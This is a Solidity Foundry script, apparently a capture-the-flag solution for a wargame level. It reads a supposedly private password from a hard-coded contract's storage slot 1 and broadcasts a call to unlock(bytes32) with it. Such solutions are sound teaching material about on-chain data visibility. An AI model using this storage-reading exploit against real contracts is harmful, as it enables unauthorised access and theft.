// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

contract Level8Script is Script {
    address addr = 0xdF8C2463216234CF248487dd91c5b1a865C8b9CB;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        bytes32 pwd = vm.load(addr, bytes32(uint256(1)));
        (bool c,) = address(addr).call(abi.encodeWithSignature("unlock(bytes32)", pwd));
        console.log(c);
        console.log(string(abi.encodePacked(pwd)));
        vm.stopBroadcast();
    }
}
